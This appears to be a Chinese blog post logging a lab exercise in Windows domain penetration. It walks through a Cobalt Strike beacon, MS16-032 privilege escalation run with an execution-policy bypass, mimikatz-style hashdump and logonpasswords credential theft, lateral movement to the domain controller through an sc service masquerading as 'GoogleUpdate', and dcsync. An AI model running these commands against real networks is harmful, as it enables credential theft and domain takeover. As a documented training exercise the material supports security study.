---
layout: post
title:  域渗透学习一
tags: [域渗透]
---

# 概述
web选手学习域渗透记录。

## 环境
搭建一个简单的环境，由于刚开始，所以环境拓扑比较简单，但不影响学习。
三台主机：
1. win2016 域控
2. win7 域计算机
3. debian 攻击机
3台机器在同一个内网中，并且可以互相访问，同时未安装杀软等防护软件。

## 流程
1. 在debian上安装cs，同时生成beacon.exe
2. 在win7上运行beacon.exe，上线；
3. 利用ms16-032在win7提权到system权限；
4. 为了简单，在win7上登陆域administrator账号
5. 利用mimikatz抓密码，获得administrator密码
6. 利用cs生成windows服务beacon2.exe
7. 利用administrator权限和sc命令在域控上执行beacon2.exe，域控上线。

## 记录
模拟时，自己在win7运行，实际则可能是社工，钓鱼邮件，水坑，漏洞等。

有win7权限之后，在cs中抓密码，提示权限不够，需要提权。[MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032),下载exe之后，发现是打开system权限的cmd，并没有回连。几次尝试之后使用powershell脚本。不过先修改一下MS16-032.ps1，因为运作之后，发现没有执行。查看脚本发现是函数，所以在最后加一行调用Invoke-MS16-032，同时将333行要执行的程序改为我们的beacon.exe的路径。
```
# 将shell调整为实时交互
sleep 0
# 查看当前目录
pwd
# 上传MS16-032.ps1
upload
# 列目录，查看已经上传成功
ls
# 执行powershell，由于有策略限制，使用命令bypass
shell powershell.exe -ExecutionPolicy Bypass -File MS16-032.ps1
```
得到system权限shell
```
sleep 0
# 获取hash
hashdump
# 获取明文密码，可以获取到当前用户密码
logonpasswords

```
在域控上远程登陆win7，使用administrator账号，提示会断开当前帐户链接，取消登陆。
执行logonpasswords未发现新密码。
在win7机器使用域控administrator登陆。
再次运行logonpasswords，获取administrator密码

```
# 在user权限shell中执行命令，获取域控主机名称
shell net time /domain
# ping ip
shell  ping -n 1 win2016
# spawnas admin权限
spawnas 选择域administrator密码
```
进入administrator权限shell，利用sc创建服务执行，这里有个坑，就是sc命令，=号后面要有空格，导致我好长时间不知道哪里有问题。跑到win7上面去执行，也是报错，刚开始看输出，感觉就是help，一直纳闷。后面仔细看时，发现里面有一句，=号后面要有空格隔开，真是坑。
首先生成windows服务的beacon2.exe
```
# 上传beacon2.exe
upload

shell net use \\win2016\ipc$ "密码" /user:Administrator

shell dir \\win2016\c$

shell copy beacon2.exe \\win2016\c$

shell sc \\win2016 create GoogleUpdate binPath= "C:\beacon2.exe"

shell sc \\win2016 start GoogleUpdate

```
获得域控system权限shell
hashdump获取hash

```
dcsync 域

```

### 引用
1. https://security.tencent.com/index.php/blog/msg/154
2. https://zer1t0.gitlab.io/posts/attacking_ad/


